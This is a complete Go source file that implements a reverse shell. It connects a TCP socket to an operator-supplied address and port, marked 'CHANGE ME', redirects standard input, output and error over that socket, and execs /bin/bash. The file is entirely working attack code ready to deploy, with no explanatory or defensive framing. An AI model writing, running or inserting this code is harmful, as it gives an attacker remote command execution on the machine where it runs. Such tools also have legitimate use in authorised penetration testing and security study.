package main

import (
	"log"
	"syscall"

	"golang.org/x/sys/unix"
)

func main() {
	GoSock, err := unix.Socket(unix.AF_INET, unix.SOCK_STREAM, 0)
	if err != nil {
		log.Fatalf("Failed to create socket %v", err)
	}
	sockaddr_in := &unix.SockaddrInet4{}
	sockaddr_in.Port = 9000                // CHANGE ME
	sockaddr_in.Addr = [4]byte{0, 0, 0, 0} // CHANGE ME
	err = unix.Connect(GoSock, sockaddr_in)
	if err != nil {
		log.Fatalf("Failed to connect to socket! %v", err)
	}
	unix.Dup2(GoSock, syscall.Stdin)
	unix.Dup2(GoSock, syscall.Stdout)
	unix.Dup2(GoSock, syscall.Stderr)
	var argv []string
	argv = append(argv, "/bin/bash")
	unix.Exec("/bin/bash", argv, nil)
}
